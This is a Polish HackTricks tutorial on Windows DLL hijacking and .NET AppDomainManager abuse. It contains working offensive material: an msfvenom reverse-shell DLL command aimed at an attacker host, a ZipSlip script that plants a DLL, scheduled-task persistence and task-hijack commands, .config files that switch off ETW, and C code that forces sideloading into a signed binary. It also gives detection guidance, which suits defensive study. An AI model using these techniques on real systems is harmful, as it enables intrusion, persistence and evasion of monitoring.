# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na skłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Metodę tę wykorzystuje się głównie do wykonania kodu i zapewnienia trwałości, a rzadziej do eskalacji uprawnień. Choć tutaj skupiamy się na eskalacji, sposób przejęcia pozostaje taki sam niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod DLL hijacking, a skuteczność każdej z nich zależy od sposobu, w jaki aplikacja ładuje biblioteki DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnej biblioteki.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce przeszukiwania przed oryginalną biblioteką, wykorzystując kolejność wyszukiwania stosowaną przez aplikację.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, błędnie uznając ją za wymaganą, lecz nieistniejącą bibliotekę.
4. **DLL Redirection**: Zmiana parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS. Metoda ta jest często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może również implementować **własny loader DLL**. Uprzywilejowany proces może wyliczyć pliki w katalogu podrzędnym, takim jak `Libraries` lub `Plugins`, a następnie przekazać wybraną bibliotekę DLL do programu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki dokładnie w tym katalogu, potraktuj to jako wskazówkę do dalszej analizy: potwierdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru pliku i możliwość wywołania operacji ładowania. Katalog z prawem zapisu obok pliku wykonywalnego nie dowodzi, że proces ładuje z niego biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + assembly atakującego)

Klasyczne DLL sideloading to nie jedyny sposób na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również **plik konfiguracyjny aplikacji** o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). W tym pliku można zdefiniować własny **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego assembly umieszczony obok pliku EXE, CLR załaduje go **przed zwykłą ścieżką wykonywania kodu aplikacji** i uruchomi w zaufanym procesie.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć własnego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktyczne uwagi:
- Ta technika dotyczy **wyłącznie .NET Framework**. Wykorzystuje parsowanie konfiguracji CLR, a nie kolejność wyszukiwania DLL w Win32.
- Hostem musi być rzeczywiście **managed EXE**. Szybki triage: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie **nagłówka CLR Runtime** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`); zwykle znajduje się on **obok pliku EXE**.
- Ta technika przydaje się w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwe managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora lub aktualizacji, AppDomainManager hijacking może posłużyć jako **pierwszy etap**, po którym można użyć klasycznego DLL sideloading lub reflective loading w kolejnych etapach.

### AppDomainManager jako downloader i mechanizm inicjujący zadanie harmonogramu

Praktyczny schemat włamania polega na połączeniu zaufanego managed EXE zarówno ze złośliwym plikiem `*.config`, jak i złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **niewielki bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub aktualizator .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiadujący plik konfiguracyjny powoduje, że CLR ładuje assembly atakującego **przed rozpoczęciem działania właściwej aplikacji**.
3. Złośliwy manager wykonuje **kontrolę ścieżki** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE uruchomiono z `Downloads`, i pozwala uruchomić drugi etap wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli kontrola się powiedzie, pobiera właściwy payload do ścieżki zapisywalnej przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą zadania harmonogramu.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc triage oparty wyłącznie na sumach kontrolnych głównego pliku binarnego może nie wykryć naruszenia.
- Prosta **analiza antyanalityczna oparta na ścieżce** jest powszechna: przeniesienie zestawu ZIP/EXE/DLL na pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- Biblioteka DLL AppDomainManager pierwszego etapu może pozostać niewielka i mało rzucać się w oczy, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym schemacie:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notatki:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często lepiej klasyfikować jako **execution/persistence przez nadużycie konfiguracji .NET** niż klasyczne hijacking kolejności wyszukiwania brakującej DLL, mimo że operatorzy często łączą obie techniki.

Wskaźniki do wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek rozpakowywania ZIP**, `Downloads`, `%TEMP%` lub innych katalogów zapisywalnych przez użytkownika, obok których znajduje się plik `<exe>.config`.
- Nowe zaplanowane zadania, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a ich nazwy przypominają aktualizatory przeglądarek/dostawców.
- Krótkotrwałe procesy bootstrapujące zarządzane przez .NET, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, jeśli ścieżka pliku wykonywalnego nie odpowiada oczekiwanemu katalogowi profilu użytkownika.

### Przejęcie istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideload

W przypadku persistence nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizatora**, a następnie **zmieniają akcję zadania**, tak aby jego istniejąca nazwa, autor i wyzwalacz nadal wyglądały znajomo dla zespołów obrony.

Możliwy do ponownego wykorzystania przebieg:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby zadanie uruchamiało **zaufany plik EXE hosta** z katalogu stagingowego zapisywalnego przez użytkownika, który następnie wykonuje side-load lub ładuje rzeczywisty payload przez AppDomain.
4. Zarejestruj ponownie to samo zadanie zamiast tworzyć nowy, oczywisty artefakt persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest trudniej go wykryć:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak aktualizator dostawcy).
- Uruchamia je usługa **Task Scheduler**, więc walidacja procesu nadrzędnego/przodków często wykrywa oczekiwany łańcuch uruchamiania zadań, a nie `explorer.exe`.
- Zespoły DFIR, które wyszukują tylko **nowe nazwy zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML w `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z danymi bazowymi.
- Generuj alert, gdy **zadanie aktualizatora wyglądające na pochodzące od dostawcy** uruchamia się z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik .NET EXE z plikiem `*.config` znajdującym się w tym samym katalogu.

> [!TIP]
> Aby zobaczyć łańcuch krok po kroku, który łączy przygotowanie HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloadingiem, zapoznaj się z poniższym workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 poniższych filtrów**:

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących DLL**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, na przykład **"Process Name" "contains" `<exec name>`**, uruchom go, a następnie zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której masz uprawnienia zapisu. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz szczegółowe informacje o sposobie ładowania DLL.**

**Aplikacje Windows** wyszukują DLL, korzystając z zestawu **predefiniowanych ścieżek wyszukiwania** w określonej kolejności. Do DLL hijackingu dochodzi, gdy szkodliwa DLL zostanie umieszczona w jednym z tych katalogów tak, aby została załadowana przed oryginalną DLL. Można temu zapobiec, dbając o to, by aplikacja używała ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która zwraca ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla poszczególnych aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy ustalaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy ta opcja jest wyłączona, bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

DLL można też załadować ze ścieżki bezwzględnej, a nie na podstawie nazwy. W takim przypadku Windows szuka samej DLL wyłącznie pod tą ścieżką; zależności wskazane nazwą nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Łączenie dowolnego zapisu pliku z przejęciem brakującej DLL

**Powiązana technika:** [przełączanie punktu montowania sterowane oplockiem przeciwko uprzywilejowanemu mechanizmowi naprawczemu](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny uruchamia się **zgodnie z harmonogramem lub jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli masz prymityw **dowolnego zapisu w stylu ZipSlip**, przygotuj ZIP, którego wpis wychodzi poza katalog rozpakowywania, aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanego folderu odbiorczego/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowaną metodą deterministycznego wpływania na ścieżkę wyszukiwania bibliotek DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można wymusić, aby proces docelowy, który rozwiązuje importowaną bibliotekę DLL na podstawie nazwy (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), załadował złośliwą bibliotekę DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardową wartość DllPath wskazującą kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny procesu docelowego będzie rozwiązywał bibliotekę DLL na podstawie nazwy, loader uwzględni podaną wartość DllPath podczas wyszukiwania, umożliwiając niezawodny sideloading, nawet gdy złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub ładować ją za pomocą LoadLibrary na podstawie nazwy (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki bezwzględne nie mogą zostać przejęte. Eksporty przekazywane dalej i SxS mogą zmienić kolejność wyszukiwania.

Minimalny przykład w C (ntdll, ciągi znaków wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekazujący wywołania do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając powyższej techniki. Loader rozwiąże import za pomocą podanej ścieżki DllPath i załaduje DLL z innej lokalizacji.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych atakach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager w .NET za pomocą `.exe.config`

W przypadku celów **.NET Framework** sideloading może nastąpić **przed `Main()`** bez patchowania pamięci, poprzez nadużycie pliku **`.exe.config`** znajdującego się obok aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania DLL Win32, atakujący umieszcza prawidłowy plik EXE .NET obok złośliwego pliku konfiguracyjnego i co najmniej jednego kontrolowanego przez siebie zestawu.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Hostowy plik EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Plik konfiguracyjny ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko uruchomieniowe utworzyło kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager uzyskuje możliwość wykonywania kodu **przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ten sam plik konfiguracyjny może wymusić, aby CLR najpierw rozwiązywał odwołania do lokalnych zestawów (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetrię środowiska uruchomieniowego bez patchowania inline.

Schemat typowy dla kampanii (dokładne zagnieżdżenie może się różnić zależnie od dyrektywy lub wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** ogranicza rozwiązywanie assembly do katalogu aplikacji, zmieniając ten folder w przewidywalny obszar do sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się logika legalnej aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może umożliwić aplikacji z pełnym zaufaniem załadowanie niepodpisanych lub zmodyfikowanych assembly bez błędu weryfikacji strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór środowiska uruchomieniowego jest bardziej przewidywalny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** na podstawie konfiguracji, zamiast gdy implant modyfikuje w pamięci `EtwEventWrite`.

Schemat działania zaobserwowany w niedawnych kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnie wyglądającego folderu aktualizacji **AppData**, zmienia nazwę hosta na coś w rodzaju `update.exe` i ponownie go uruchamia za pomocą **zaplanowanego zadania**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany proces nadrzędny `svchost.exe` uruchomiony przez Task Scheduler) przed załadowaniem końcowego pliku DLL/eksportu RAT.

Wskazówki dotyczące wykrywania:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET**, które uruchamiają się z podejrzanymi plikami **`.config`** w sąsiedztwie, w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zaplanowane zadania, które ponownie uruchamiają pliki binarne aktualizacji o zmienionej nazwie z katalogów **`%LOCALAPPDATA%`** lub katalogów aplikacji w stylu `\bin\update\`.
- Łańcuchy procesów nadrzędnych i podrzędnych, w których zaplanowane zadanie uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza producenta z własnego katalogu.

#### Wyjątki dotyczące kolejności wyszukiwania DLL opisane w dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **plik DLL o tej samej nazwie co plik już załadowany do pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego sprawdza przekierowania i manifest, a następnie domyślnie używa DLL znajdującej się już w pamięci. **W takiej sytuacji system nie wyszukuje pliku DLL**.
- Jeśli DLL jest rozpoznawana jako **znana DLL** dla bieżącej wersji Windows, system użyje jej wersji znanej DLL wraz ze wszystkimi jej zależnymi plikami DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych plików DLL przebiega tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkową DLL zidentyfikowano za pomocą pełnej ścieżki.

### Podnoszenie uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch poziomy lub boczny), a któremu **brakuje DLL**.
- Upewnij się, że masz **dostęp do zapisu** do dowolnego **katalogu**, w którym będzie **wyszukiwana** **DLL**. Może to być katalog pliku wykonywalnego lub katalog w ścieżce systemowej.

Takie warunki wstępne rzadko występują domyślnie: uprzywilejowanym plikom wykonywalnym zwykle nie brakuje zależności DLL, a zwykli użytkownicy zazwyczaj nie mogą zapisywać w katalogach systemowej ścieżki wyszukiwania. Błędnie skonfigurowane środowiska mogą jednak spełniać oba warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Choć jego głównym celem jest ominięcie UAC, zawiera PoC DLL hijacking dla konkretnych wersji Windows, które często można dostosować do znalezionego katalogu z prawem zapisu.

Zauważ, że możesz **sprawdzić swoje uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **sprawdź uprawnienia wszystkich katalogów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz też sprawdzić importy pliku wykonywalnego i eksporty biblioteki DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Aby zapoznać się z pełnym poradnikiem dotyczącym **wykorzystania DLL Hijacking do eskalacji uprawnień** przy uprawnieniach do zapisu w **folderze System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w systemowym PATH.\
Inne przydatne narzędzia automatyczne do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy niezbędnych do jego skutecznego wykorzystania będzie **utworzenie dll eksportującej co najmniej wszystkie funkcje, które plik wykonywalny będzie z niej importować**. Pamiętaj jednak, że DLL Hijacking przydaje się do [eskalacji z poziomu Medium Integrity do High **(z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnej dll** znajdziesz w tym opracowaniu na temat DLL Hijacking, skupionym na DLL hijacking w celu wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą przydać się jako **szablony** lub do utworzenia **dll z eksportowanymi niewymaganymi funkcjami**.

## **Tworzenie i kompilowanie DLL**

### **Proksowanie DLL**

Zasadniczo **proxy DLL** to biblioteka DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** funkcjonalności i **działania** zgodnie z **oczekiwaniami**, poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

